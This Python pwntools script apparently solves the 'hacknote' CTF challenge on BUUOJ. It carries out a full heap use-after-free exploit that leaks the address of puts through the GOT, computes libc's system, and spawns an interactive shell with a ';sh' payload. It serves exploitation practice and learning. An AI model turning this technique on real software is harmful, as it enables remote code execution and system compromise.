from pwn import *
context(os = "linux", arch = "i386")
context.log_level = "debug"

if args.REMOTE:
    p = remote('node4.buuoj.cn', 26216)
else:
    context.terminal = ['tmux', 'splitw', '-h']
    p = process('./hacknote', env = {'LD_PRELOAD': './libc_32.so.6'})
    gdb.attach(p)

def add(size: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Note size :', str(size).encode())
    p.sendafter(b'Content :', content)

def remove(index: int):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())

def show(index: int):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())

# 学习任何知识都需要细心、耐心，切记

e = ELF('./hacknote')
libc = ELF('./libc_32.so.6')
# print(hex(libc.sym['free']))
put_addr = 0x804862b

add(13, b'abcd') # 0
add(13, b'efgh') # 1

# fastbin，不会与top chunk合并
remove(0)
remove(1)

# 这里换成free就不对，不知道为什么
add(8, p32(put_addr) + p32(e.got['puts'])) # leak address of puts() in libc
show(0)

puts_addr = u32(p.recv(4))
libc_base = puts_addr - libc.sym['puts']
p.success(hex(libc_base))

system_addr = libc_base + libc.sym['system']

remove(2) # send back to fastbin
add(8, p32(system_addr) + b';sh\x00')
show(0)

p.interactive()